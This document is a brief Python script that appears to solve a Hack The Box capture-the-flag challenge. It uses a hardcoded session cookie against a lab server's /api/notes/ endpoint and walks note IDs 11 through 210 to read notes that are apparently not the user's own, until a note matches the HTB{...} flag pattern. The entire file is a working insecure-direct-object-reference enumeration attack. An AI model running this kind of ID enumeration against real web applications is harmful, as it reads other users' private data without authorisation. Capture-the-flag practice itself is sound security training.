
import requests
import re

BASE_URL = "http://142.93.106.211:32270"
SESSION_COOKIE = "s%3AmxcMYsGdhsGvJXqKY-sJWcRdW98d9Edy.l6dnkxJNt8DhaI2fVc6QTEPfNmlWB2lrJXNcq3T%2FwgA" # Replace with your actual session cookie

def get_note_content(note_id, session_cookie):
    url = f"{BASE_URL}/api/notes/{note_id}"
    headers = {
        "Cookie": f"connect.sid={session_cookie}"
    }
    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Error fetching note {note_id}: {e}")
        return None

def find_flag():
    flag_pattern = re.compile(r"HTB\{.*\}")
    
    # Note IDs range from 11 to 210 (10 + 1 to 10 + 200)
    for note_id in range(11, 211):
        print(f"Checking note ID: {note_id}")
        note_data = get_note_content(note_id, SESSION_COOKIE)
        
        if note_data and "content" in note_data:
            match = flag_pattern.search(note_data["content"])
            if match:
                print(f"Flag found in note {note_id}: {match.group(0)}")
                return match.group(0)
    
    print("Flag not found.")
    return None

if __name__ == "__main__":
    flag = find_flag()
    if flag:
        with open("flag.txt", "w") as f:
            f.write(flag)
        print("Flag saved to flag.txt")
